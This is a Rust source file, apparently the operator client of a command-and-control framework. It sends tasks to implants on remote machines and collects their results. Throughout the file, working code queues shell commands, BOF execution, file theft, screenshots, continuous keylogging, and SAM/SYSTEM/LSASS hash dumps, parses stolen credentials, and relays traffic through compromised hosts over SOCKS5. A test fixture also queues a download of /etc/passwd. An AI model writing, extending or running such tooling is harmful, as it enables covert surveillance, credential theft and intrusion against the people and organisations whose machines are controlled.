            if !has_pending {
                let cmd_json = serde_json::json!({ "type": "keylog", "action": 2 });
                match enqueue_simple(&client, srv, kl_session, cmd_json, token).await {
                    Ok(tid) => {
                        pending.push(PendingTask {
                            session: kl_session.clone(),
                            task_id: tid,
                            kind: TaskKind::KeylogStream {
                                interval_secs: *kl_interval,
                            },
                            // Delay first poll by the interval so dumps are
                            // spaced `interval_secs` apart rather than hammering.
                            backoff: Duration::from_secs(*kl_interval as u64),
                            last_poll: Instant::now(),
                            started_at: Instant::now(),
                            chunks: Vec::new(),
                            saw_eof: false,
                        });
                    }
                    Err(e) => log_push(&mut log_buf, &format!("! keylog stream: {e}"), Level::Err),
                }
            }
        }

        // Drain the in-TUI SOCKS relay's log outbox (if running) into log_buf so
        // relay events (chan open / connect failed / data backlog / accept error)
        // surface in the TUI event stream — the relay writes to this outbox via
        // its log_sink instead of stderr (which would corrupt the alternate
        // screen). Tagged with the relay session so lines route to the right pane.
        if let Some(ref relay) = socks_relay {
            let drained: Vec<String> = relay.log_outbox.lock().unwrap().drain(..).collect();
            for line in drained {
                log_push_session(
                    &mut log_buf,
                    &line,
                    Level::Info,
                    Some(relay.ctx.session.clone()),
                );
            }
        }

        if !log_buf.is_empty() || parsed_buf.is_some() {
            let _ = snap_tx.send(Snapshot {
                sessions: Vec::new(),
                log_lines: std::mem::take(&mut log_buf),
                connected: true,
                parsed: parsed_buf.take(),
            });
        }

        tokio::time::sleep(SESSION_POLL).await;
    }
}

enum PollOutcome {
    Done(Option<String>),
    Pending,
    Err(String),
}

fn route_result(
    log_buf: &mut Vec<LogLine>,
    parsed_buf: &mut Option<ParsedTable>,
    t: &PendingTask,
    out: Option<String>,
) {
    let out = match out {
        Some(o) => o,
        None => {
            log_push_session(
                log_buf,
                &format!("[{}] (task {} no output)", short(&t.session), t.task_id),
                Level::Warn,
                Some(t.session.clone()),
            );
            return;
        }
    };
    match &t.kind {
        TaskKind::Shell(parse) => match parse {
            ParseAs::None => {
                for line in out.lines() {
                    log_push_session(log_buf, line, Level::Info, Some(t.session.clone()));
                }
            }
            ParseAs::Files => {
                let rows = parse::parse_any_files(&out);
                *parsed_buf = Some(ParsedTable::Files(rows));
            }
            ParseAs::Procs => {
                let rows = parse::parse_any_procs(&out);
                *parsed_buf = Some(ParsedTable::Procs(rows));
            }
            ParseAs::Creds => {
                let rows = parse::parse_creds(&out);
                *parsed_buf = Some(ParsedTable::Creds(rows));
            }
        },
        TaskKind::Bof { name } => {
            for line in out.lines() {
                log_push_session(
                    log_buf,
                    &format!("[{}] bof {}: {}", short(&t.session), name, line),
                    Level::Info,
                    Some(t.session.clone()),
                );
            }
        }
        TaskKind::Download { .. } | TaskKind::Screenshot => {
            // handled by finish_chunked (分块重组 + 落盘)
        }
        TaskKind::Hashdump { method } => {
            // Hashdump result is text Output: SAM/SYSTEM hive stream notes
            // (method 0/1) or the LSASS PID + operator instruction (method 2).
            // Display it line-by-line, prefixed with the method for clarity.
            let label = match method {
                0 => "hashdump sam",
                1 => "hashdump system",
                2 => "hashdump lsass",
                _ => "hashdump",
            };
            for line in out.lines() {
                log_push_session(
                    log_buf,
                    &format!("[{}] {}: {}", short(&t.session), label, line),
                    Level::Info,
                    Some(t.session.clone()),
                );
            }
        }
        TaskKind::Ping => {
            // An `ok` result surfaces here as the empty string; anything else is
            // treated as the beacon's response. Empty ⟺ alive.
            if out.trim().is_empty() {
                log_push_session(
                    log_buf,
                    &format!("[{}] ping: alive", short(&t.session)),
                    Level::Ok,
                    Some(t.session.clone()),
                );
            } else {
                log_push_session(
                    log_buf,
                    &format!("[{}] ping: {}", short(&t.session), out.trim()),
                    Level::Info,
                    Some(t.session.clone()),
                );
            }
        }
        TaskKind::KeylogStream { .. } => {
            // Continuous dump: route each keystroke batch line-by-line to the
            // session log, mirroring `Shell(ParseAs::None)`. An empty (but
            // present) dump means nothing was typed since the last poll — emit
            // nothing so the stream stays quiet instead of spamming "(no output)".
            if !out.trim().is_empty() {
                for line in out.lines() {
                    log_push_session(log_buf, line, Level::Info, Some(t.session.clone()));
                }
            }
        }
    }
}

fn finish_chunked(
    log_buf: &mut Vec<LogLine>,
    parsed_buf: &mut Option<ParsedTable>,
    t: &PendingTask,
) {
    // 重组分块数据
    let mut chunks = t.chunks.clone();
    chunks.sort_by_key(|(s, _)| *s);
    let mut out = Vec::new();
    for (_, d) in chunks {
        out.extend(d);
    }
    // 根据 task kind 决定保存路径和日志消息
    let (save_path, log_msg) = match &t.kind {
        TaskKind::Download { path, local } => {
            let sp = match local {
                Some(l) if !l.trim().is_empty() => l.clone(),
                _ => {
                    let basename = path.rsplit(['/', '\\']).next().unwrap_or(path);
                    format!("downloads/{basename}")
                }
            };
            (sp, format!("downloaded {} ({} bytes)", path, out.len()))
        }
        TaskKind::Screenshot => {
            let sp = format!("downloads/screenshot-{}.png", t.task_id);
            (sp, format!("screenshot saved ({} bytes)", out.len()))
        }
        _ => return,
    };
    if let Some(parent) = std::path::Path::new(&save_path).parent() {
        if !parent.as_os_str().is_empty() {
            let _ = std::fs::create_dir_all(parent);
        }
    }
    if let Err(e) = std::fs::write(&save_path, &out) {
        log_push_session(
            log_buf,
            &format!("[{}] ! save {save_path}: {e}", short(&t.session)),
            Level::Err,
            Some(t.session.clone()),
        );
        return;
    }
    log_push_session(
        log_buf,
        &format!("[{}] {} -> {save_path}", short(&t.session), log_msg),
        Level::Ok,
        Some(t.session.clone()),
    );
    // 截图落盘后弹出 fullscreen 图片 overlay（path + bytes）。下载不弹 overlay
    // （文件在磁盘上，日志已指明路径）。
    if matches!(t.kind, TaskKind::Screenshot) {
        *parsed_buf = Some(ParsedTable::Image {
            path: save_path,
            bytes: out.len(),
        });
    }
}

// ---- async REST helpers (all on the worker) ----

fn authed(req: reqwest::RequestBuilder, token: &Option<String>) -> reqwest::RequestBuilder {
    match token {
        Some(t) => req.bearer_auth(t),
        None => req,
    }
}

async fn fetch_sessions(
    c: &reqwest::Client,
    server: &str,
    token: &Option<String>,
) -> anyhow::Result<Vec<SessionView>> {
    Ok(authed(c.get(format!("{server}/api/sessions")), token)
        .send()
        .await?
        .json()
        .await?)
}

async fn enqueue_shell(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    args: &str,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body =
        serde_json::json!({ "session": session, "command": { "type": "shell", "args": args } });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok(ack.task_id)
}

async fn enqueue_bof(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    name: &str,
    args: &str,
    data_hex: &str,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let args_vec: Vec<&str> = if args.trim().is_empty() {
        Vec::new()
    } else {
        args.split_whitespace().collect()
    };
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "bof", "name": name, "args": args_vec, "data_hex": data_hex }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok(ack.task_id)
}

async fn enqueue_upload(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    name: &str,
    data_hex: &str,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "upload", "name": name, "data_hex": data_hex }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok(ack.task_id)
}

async fn enqueue_download(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    path: &str,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({
        "session": session, "command": { "type": "download", "path": path }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok(ack.task_id)
}

/// Task a beacon to exit. Fire-and-forget (we don't poll its result).
async fn enqueue_exit(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    token: &Option<String>,
) -> anyhow::Result<()> {
    let body = serde_json::json!({ "session": session, "command": { "type": "exit" } });
    let _ = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?;
    Ok(())
}

/// Set the beacon's beacon interval (and optional jitter %).
async fn enqueue_sleep(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    seconds: u32,
    jitter_pct: u8,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "sleep", "seconds": seconds, "jitter_pct": jitter_pct }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok(ack.task_id)
}

/// Liveness probe. Returns the task id; an `ok` result confirms alive.
async fn enqueue_ping(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({ "session": session, "command": { "type": "ping" } });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok(ack.task_id)
}

/// 文件系统操作（cd/mkdir/rm/mv/cp）。
async fn enqueue_fileop(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    op: &str,
    path: &str,
    dest: Option<&str>,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "fileop", "op": op, "path": path, "dest": dest }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok(ack.task_id)
}

/// 从 implant 发起出站连接（P2P / rportfwd）。
/// Client-side cap on concurrent relay channels for the in-TUI relay. Mirrors
/// the headless bridge default (headroom under the implant's MAX_CHANNELS=16).
const SOCKS_MAX_CHAN: usize = 14;

/// Build the shared [`socks::BridgeCtx`], bind the SOCKS5 listener, and spawn
/// the accept loop. Returns the [`SocksRelay`] handle the worker stores.
///
/// The in-TUI relay reuses the headless bridge's code verbatim: handshake
/// ([`socks::handshake`]), per-connection state machine ([`socks::relay`]), and
/// ChanTable. The ONLY difference is the results source — the worker feeds
/// channel rows via [`socks::handle_row`] from its own drain (it is the sole
/// `/api/results` consumer for the session), whereas the headless bridge runs
/// its own `poll_loop`. So no second consumer is created and the P0-A invariant
/// holds.
///
/// Auth policy: the in-TUI relay is loopback-only by construction (the operator
/// typed a bind address inside the TUI; default `127.0.0.1:1080`). A non-
/// loopback bind is refused with an error — use the headless `nyx-cli socks`
/// subcommand with `--socks-user/--socks-pass` for a non-loopback listener.
/// This is the same P0-10 open-proxy guard as `socks::run_socks`, enforced here
/// so the TUI path can't accidentally start an open proxy without creds.
fn start_socks_relay(
    client: &reqwest::Client,
    server: String,
    token: Option<String>,
    session: String,
    bind_addr: &str,
) -> Result<SocksRelay, String> {
    // Bind synchronously via a block_in_place-free std::net bind + tokio convert,
    // since worker_loop is a current-thread runtime and a blocking TcpListener
    // bind is fast + rare (once per /socks start). tokio::net::TcpListener::bind
    // is async but needs the runtime — we're already on it (block_on(worker_loop)).
    // Use the async bind by spawning onto the runtime via a oneshot.
    //
    // Simpler: std::net bind + set nonblocking + tokio::net::TcpListener::from_std.
    // This avoids any spawn-before-listener dance and is exactly how the runtime
    // bootstraps a listener on a current-thread executor.
    let listen: std::net::SocketAddr = bind_addr
        .parse()
        .map_err(|e| format!("invalid bind addr {bind_addr:?}: {e}"))?;
    let is_loopback = listen.ip().is_loopback();
    if !is_loopback {
        return Err(format!(
            "in-TUI SOCKS relay is loopback-only (bind {listen} is not loopback). For a \
             non-loopback listener with RFC 1929 auth, run the headless `nyx-cli socks` \
             subcommand with --socks-user/--socks-pass."
        ));
    }
    let std_listener =
        std::net::TcpListener::bind(listen).map_err(|e| format!("bind {listen} failed: {e}"))?;
    std_listener
        .set_nonblocking(true)
        .map_err(|e| format!("set_nonblocking on {listen}: {e}"))?;
    let listener = tokio::net::TcpListener::from_std(std_listener)
        .map_err(|e| format!("listener convert: {e}"))?;

    // In-TUI relay log outbox: the BridgeCtx's log_sink pushes lines here instead
    // of stderr (which would corrupt the TUI alternate screen). The worker drains
    // this into log_buf each pass. Capped to avoid unbounded growth if the worker
    // stalls (mirrors LOG_BUFFER_CAP's philosophy).
    let log_outbox: Arc<std::sync::Mutex<std::collections::VecDeque<String>>> = Arc::new(
        std::sync::Mutex::new(std::collections::VecDeque::with_capacity(64)),
    );
    let sink_outbox = log_outbox.clone();
    let ctx = Arc::new(socks::BridgeCtx {
        // The worker's reqwest client is reused — same timeouts, same TLS.
        // (Cloning a reqwest::Client is cheap — it's an Arc internally.)
        client: client.clone(),
        server,
        token,
        session,
        // Loopback-only: NO-AUTH (method 0x00). Non-loopback is refused above,
        // so this never produces an open proxy.
        socks_auth: None,
        chans: std::sync::Mutex::new(socks::ChanTable {
            by_chan: HashMap::new(),
            seen_open: std::collections::HashSet::new(),
        }),
        task_to_chan: std::sync::Mutex::new(HashMap::new()),
        max_chan: SOCKS_MAX_CHAN,
        active: std::sync::atomic::AtomicUsize::new(0),
        // Relay log lines → shared outbox (drained by worker_loop into log_buf).
        log_sink: Arc::new(move |msg: &str| {
            let mut g = sink_outbox.lock().unwrap();
            // Cap so a chatty/faulty relay can't exhaust memory if the worker
            // is somehow not draining (it drains every pass, so this is just a
            // backstop).
            if g.len() < LOG_BUFFER_CAP {
                g.push_back(msg.to_string());
            }
        }),
    });

    // Accept loop: a spawned task owns the listener. On each accepted connection
    // it spawns a `socks::relay::handle_conn` task (the per-connection state
    // machine). Both run on the worker's current_thread runtime — they progress
    // whenever worker_loop awaits (every HTTP call + the per-pass sleep), which
    // is plenty for a beacon-paced relay (latency is one sleep cycle/direction).
    let accept_ctx = ctx.clone();
    let accept_task = tokio::task::spawn(async move {
        loop {
            match listener.accept().await {
                Ok((stream, peer)) => {
                    accept_ctx.log(&format!("[socks] inbound SOCKS5 from {peer}"));
                    let c = accept_ctx.clone();
                    tokio::task::spawn(async move {
                        socks::relay::handle_conn(stream, c).await;
                    });
                }
                Err(e) => {
                    accept_ctx.log(&format!("[socks] accept error: {e}"));
                    // A transient accept error shouldn't kill the listener.
                    tokio::time::sleep(Duration::from_millis(100)).await;
                }
            }
        }
    });

    Ok(SocksRelay {
        ctx,
        accept_task,
        bind_addr: bind_addr.to_string(),
        log_outbox,
    })
}

/// First 8 chars of a session id, for terse logging (mirrors socks/mod.rs).
fn session_short(session: &str) -> &str {
    if session.len() >= 8 {
        &session[..8]
    } else {
        session
    }
}

async fn enqueue_pivot(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    host: &str,
    port: u16,
    token: &Option<String>,
) -> anyhow::Result<(u64, Option<u32>)> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "connect", "host": host, "port": port }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok((ack.task_id, ack.chan))
}

/// SOCKS5 中继控制。
#[allow(clippy::too_many_arguments)]
async fn enqueue_socks(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    chan: u32,
    op: u8,
    addr: &str,
    port: u16,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "socks", "chan": chan, "op": op, "addr": addr, "port": port }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok(ack.task_id)
}

/// 通用单任务入队（command body 直接传 JSON value）。用于简单命令避免重复代码。
async fn enqueue_simple(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    command: serde_json::Value,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({ "session": session, "command": command });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok(ack.task_id)
}

async fn fetch_results(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    token: &Option<String>,
) -> anyhow::Result<Vec<ResultView>> {
    Ok(authed(
        c.get(format!("{server}/api/results"))
            .query(&[("session", session)]),
        token,
    )
    .send()
    .await?
    .json()
    .await?)
}

/// Route a single (non-file) task's result from an already-drained buffer.
///
/// This is the pure half of [`poll_result`]: given the rows already fetched for
/// the session, pick the one matching `task_id` (if any) and turn it into a
/// [`PollOutcome`]. It performs no IO and does not touch the session's result
/// queue, so it is safe to call against a buffer that holds results for many
/// tasks (the per-session demux path in `worker_loop`).
///
/// `None` is returned (as [`PollOutcome::Pending`]) when no row matches — the
/// caller decides whether that means "not ready yet".
fn poll_result_from_buf(results: &[ResultView], task_id: u64) -> PollOutcome {
    match results.iter().find(|r| r.task_id == task_id) {
        Some(r) => PollOutcome::Done(match r.kind.as_str() {
            "output" => Some(r.text.clone()),
            "ok" => Some(String::new()),
            "error" => Some(format!("[error] {}", r.text)),
            other => Some(format!("[{other}] {}", r.text)),
        }),
        None => PollOutcome::Pending,
    }
}

/// Poll a single (non-file) task. Returns `Done(None)` if no matching result yet.
///
/// Thin HTTP wrapper around [`poll_result_from_buf`]: it drains the session's
/// entire result queue via [`fetch_results`] then demuxes locally. Kept for API
/// compatibility (e.g. SOCKS-bridge-style callers); the TUI `worker_loop` uses
/// the per-session demux path instead of calling this per task.
#[allow(dead_code)]
async fn poll_result(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    task_id: u64,
    token: &Option<String>,
) -> PollOutcome {
    let rs = match fetch_results(c, server, session, token).await {
        Ok(rs) => rs,
        Err(e) => return PollOutcome::Err(e.to_string()),
    };
    poll_result_from_buf(&rs, task_id)
}

/// Accumulate one download/screenshot task's file chunks from an already-drained
/// buffer. Pure (no IO). See [`poll_result_from_buf`] for why the buffer-based
/// split exists.
fn poll_file_chunks_from_buf(
    results: &[ResultView],
    task_id: u64,
    chunks: &mut Vec<(u32, Vec<u8>)>,
    saw_eof: &mut bool,
) -> PollOutcome {
    for r in results {
        if r.task_id != task_id {
            continue;
        }
        // Screenshots stream back as `FileChunk`s (kind "file"), exactly like
        // downloads — `Response::Image`/kind "image" is a dead variant no
        // implant ever emits, so both download + screenshot tasks filter on
        // kind == "file". (Requiring "image" here silently dropped every
        // screenshot chunk.)
        if r.kind != "file" {
            continue;
        }
        let seq = r.seq.unwrap_or(0);
        // Don't silently coerce a malformed-hex chunk into empty bytes — that
        // would produce a corrupt download with a zero-filled hole and no signal
        // to the operator. Surface it as a per-download error instead. (client-cli
        // has no logger, so the visible-error path — not a log line — is how we
        // stay non-silent without corrupting the TUI.) The hex is server-produced
        // and TLS-protected, so this is rare, but silent corruption is the wrong
        // failure mode for a file transfer.
        let data = match r.data_hex.as_deref().map(hex::decode).transpose() {
            Ok(Some(d)) => d,
            Ok(None) => Vec::new(),
            Err(e) => {
                return PollOutcome::Err(format!(
                    "download chunk seq {} has malformed data_hex ({e}); \
                     aborting to avoid a silently-corrupt file",
                    r.seq.unwrap_or(0)
                ));
            }
        };
        if r.eof.unwrap_or(0) == 1 {
            *saw_eof = true;
        }
        if !chunks.iter().any(|(s, _)| *s == seq) {
            chunks.push((seq, data));
        }
    }
    if *saw_eof {
        PollOutcome::Done(None)
    } else {
        PollOutcome::Pending
    }
}

/// Poll file chunks for a download task. Accumulates into `chunks` until `eof`.
///
/// Thin HTTP wrapper around [`poll_file_chunks_from_buf`]. Kept for API
/// compatibility; the TUI `worker_loop` uses the per-session demux path instead.
#[allow(dead_code, clippy::too_many_arguments)]
async fn poll_file_chunks(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    task_id: u64,
    chunks: &mut Vec<(u32, Vec<u8>)>,
    saw_eof: &mut bool,
    token: &Option<String>,
) -> PollOutcome {
    let rs = match fetch_results(c, server, session, token).await {
        Ok(rs) => rs,
        Err(e) => return PollOutcome::Err(e.to_string()),
    };
    poll_file_chunks_from_buf(&rs, task_id, chunks, saw_eof)
}

// ---- helpers ----

fn short(s: &str) -> &str {
    &s[..s.len().min(8)]
}

fn session_signature(list: &[SessionView]) -> String {
    let mut s = String::new();
    for v in list {
        s.push_str(&v.id);
        s.push('|');
        s.push_str(&v.hostname);
        s.push('|');
        s.push_str(&v.username);
        s.push('|');
        s.push_str(&format!("{}|{}", v.is_admin, v.pending));
        s.push(';');
    }
    s
}

fn extract_session_prefix(text: &str) -> Option<String> {
    if text.starts_with('[') {
        if let Some(end_idx) = text.find(']') {
            if end_idx > 1 && end_idx <= 9 {
                let prefix = &text[1..end_idx];
                if prefix.chars().all(|c| c.is_ascii_hexdigit()) {
                    return Some(prefix.to_string());
                }
            }
        }
    }
    None
}

/// Parse the channel id out of a `channel`-kind result row's text.
///
/// The server serializes channel rows as `ResultView { kind: "channel", text:
/// "<chan N#status>", ... }` (see `server/src/lib.rs`), so the channel id lives
/// in the text rather than a dedicated field. This pulls `N` back out so the
/// worker can tag unexpected channel data with a meaningful chan number. Returns
/// `None` for anything that doesn't match the `<chan N...>` shape.
fn extract_chan_from_text(text: &str) -> Option<u64> {
    let rest = text.strip_prefix("<chan ")?.trim_start();
    let num: String = rest.chars().take_while(|c| c.is_ascii_digit()).collect();
    num.parse().ok()
}

fn log_push(buf: &mut Vec<LogLine>, text: &str, level: Level) {
    log_push_session(buf, text, level, None);
}

fn log_push_session(buf: &mut Vec<LogLine>, text: &str, level: Level, session_id: Option<String>) {
    let sid = session_id.or_else(|| extract_session_prefix(text));
    buf.push(LogLine {
        text: text.to_string(),
        level,
        session_id: sid,
    });
    if buf.len() > LOG_BUFFER_CAP {
        let drop = buf.len() - LOG_BUFFER_CAP;
        buf.drain(..drop);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_session_prefix() {
        assert_eq!(
            extract_session_prefix("[a1b2c3d4] test"),
            Some("a1b2c3d4".to_string())
        );
        assert_eq!(
            extract_session_prefix("[a1b2c3d4] $ whoami"),
            Some("a1b2c3d4".to_string())
        );
        assert_eq!(extract_session_prefix("[INFO] test"), None);
        assert_eq!(extract_session_prefix("connecting to ..."), None);
    }

    #[test]
    fn log_push_caps() {
        let mut buf = Vec::new();
        for i in 0..(LOG_BUFFER_CAP + 10) {
            log_push(&mut buf, &i.to_string(), Level::Info);
        }
        assert_eq!(buf.len(), LOG_BUFFER_CAP);
    }

    #[test]
    fn signaturedetects_change() {
        let mk = |id: &str, pend: usize| SessionView {
            id: id.into(),
            hostname: "h".into(),
            username: "u".into(),
            os: String::new(),
            is_admin: 0,
            pending: pend,
            beacon_id: 0,
            arch: 0,
            pid: 0,
            ..Default::default()
        };
        let a = vec![mk("s1", 1)];
        assert_ne!(session_signature(&a), session_signature(&[mk("s1", 2)]));
    }

    #[test]
    fn task_row_decodes_server_json() {
        // server 返回 [{task_id, command:{type, ...}}]，command 保持为 raw Value。
        let json = r#"[{"task_id":7,"command":{"type":"shell","args":"whoami"}},{"task_id":8,"command":{"type":"download","path":"/etc/passwd"}}]"#;
        let rows: Vec<TaskRow> = serde_json::from_str(json).unwrap();
        assert_eq!(rows.len(), 2);
        assert_eq!(rows[0].task_id, 7);
        assert_eq!(
            rows[0].command.get("type").and_then(|v| v.as_str()),
            Some("shell")
        );
        assert_eq!(
            rows[1].command.get("path").and_then(|v| v.as_str()),
            Some("/etc/passwd")
        );
    }

    /// Regression for the root architectural flaw: the server's `GET /api/results`
    /// DRAINS the whole session queue regardless of task_id, so the old per-task
    /// `fetch_results` + `find(task_id)` loop let whichever task polled first eat
    /// the other's row. The fix drains once per session and demuxes locally via
    /// `poll_result_from_buf`. This test simulates one drain returning both tasks'
    /// results and verifies BOTH resolve against the shared buffer — the exact
    /// invariant that previously broke.
    #[test]
    fn concurrent_tasks_on_same_session_do_not_lose_results() {
        // One drain, two tasks' rows interleaved (server returns them in arrival
        // order, not grouped by task).
        let drained = vec![
            ResultView {
                task_id: 100,
                kind: "output".into(),
                text: "task A output".into(),
                data_hex: None,
                seq: None,
                eof: None,
            },
            ResultView {
                task_id: 101,
                kind: "output".into(),
                text: "task B output".into(),
                data_hex: None,
                seq: None,
                eof: None,
            },
        ];

        // Under the old design, task 100's `fetch_results`+`find` would have
        // drained the queue, leaving task 101 with nothing. With the demux, the
        // single drained buffer serves both — neither is lost.
        match poll_result_from_buf(&drained, 100) {
            PollOutcome::Done(Some(t)) => assert_eq!(t, "task A output"),
            PollOutcome::Done(None) => panic!("task 100: Done with no output"),
            PollOutcome::Pending => panic!("task 100 lost — came back Pending"),
            PollOutcome::Err(e) => panic!("task 100 unexpected Err: {e}"),
        }
        match poll_result_from_buf(&drained, 101) {
            PollOutcome::Done(Some(t)) => assert_eq!(t, "task B output"),
            PollOutcome::Done(None) => panic!("task 101: Done with no output"),
            PollOutcome::Pending => panic!("task 101 lost — came back Pending"),
            PollOutcome::Err(e) => panic!("task 101 unexpected Err: {e}"),
        }

        // And an unrelated task id is correctly reported Pending (not lost, just
        // not present in this drain).
        assert!(matches!(
            poll_result_from_buf(&drained, 999),
            PollOutcome::Pending
        ));
    }

    /// `poll_result_from_buf` must keep the same kind→text mapping the old
    /// `poll_result` produced: "ok" → empty, "error" → prefixed, unknown kind →
    /// prefixed with the kind name.
    #[test]
    fn poll_result_from_buf_maps_kinds_like_poll_result() {
        let mk = |task_id, kind: &str, text: &str| ResultView {
            task_id,
            kind: kind.into(),
            text: text.into(),
            data_hex: None,
            seq: None,
            eof: None,
        };
        let buf = vec![
            mk(1, "ok", "ignored"),
            mk(2, "error", "boom"),
            mk(3, "output", "hello"),
            mk(4, "weird", "payload"),
        ];
        // "ok" → empty string
        assert!(matches!(
            poll_result_from_buf(&buf, 1),
            PollOutcome::Done(ref s) if s.as_deref() == Some("")
        ));
        // "error" → prefixed
        assert!(matches!(
            poll_result_from_buf(&buf, 2),
            PollOutcome::Done(ref s) if s.as_deref() == Some("[error] boom")
        ));
        // "output" → text as-is
        assert!(matches!(
            poll_result_from_buf(&buf, 3),
            PollOutcome::Done(ref s) if s.as_deref() == Some("hello")
        ));
        // unknown kind → "[<kind>] <text>"
        assert!(matches!(
            poll_result_from_buf(&buf, 4),
            PollOutcome::Done(ref s) if s.as_deref() == Some("[weird] payload")
        ));
    }

    /// Chunked tasks demux from the same shared buffer as text tasks — verifying
    /// the per-session drain covers Download/Screenshot too.
    #[test]
    fn poll_file_chunks_from_buf_demuxes_from_shared_buffer() {
        let mk = |task_id, seq, eof, hex: &str| ResultView {
            task_id,
            kind: "file".into(),
            text: format!("<chunk f#{seq}>"),
            data_hex: Some(hex.into()),
            seq: Some(seq),
            eof: Some(eof),
        };
        // One drain, chunks for task 10 (a download) interleaved with a row for
        // task 11 (an unrelated text task). The download must still see both its
        // chunks and reach eof.
        let drained = vec![
            mk(10, 0, 0, "4142"),
            ResultView {
                task_id: 11,
                kind: "output".into(),
                text: "other".into(),
                data_hex: None,
                seq: None,
                eof: None,
            },
            mk(10, 1, 1, "4344"),
        ];
        let mut chunks = Vec::new();
        let mut saw_eof = false;
        let out = poll_file_chunks_from_buf(&drained, 10, &mut chunks, &mut saw_eof);
        assert!(
            matches!(out, PollOutcome::Done(None)),
            "expected Done(None)"
        );
        assert!(saw_eof);
        // Both chunks for task 10 collected, task 11's row ignored.
        let mut got: Vec<u32> = chunks.iter().map(|(s, _)| *s).collect();
        got.sort();
        assert_eq!(got, vec![0, 1]);
        assert_eq!(
            chunks.iter().find(|(s, _)| *s == 0).unwrap().1,
            vec![0x41, 0x42]
        );
        assert_eq!(
            chunks.iter().find(|(s, _)| *s == 1).unwrap().1,
            vec![0x43, 0x44]
        );
    }

    #[test]
    fn extract_chan_from_text_parses_server_format() {
        // Server serializes channel rows as text "<chan N#status>".
        assert_eq!(extract_chan_from_text("<chan 7#open>"), Some(7));
        assert_eq!(extract_chan_from_text("<chan 42#closed>"), Some(42));
        assert_eq!(extract_chan_from_text("<chan 0#x>"), Some(0));
        // Malformed / unrelated text yields None (caller falls back to task_id).
        assert_eq!(extract_chan_from_text("not a chan row"), None);
        assert_eq!(extract_chan_from_text("<chan >"), None);
        assert_eq!(extract_chan_from_text(""), None);
    }
}
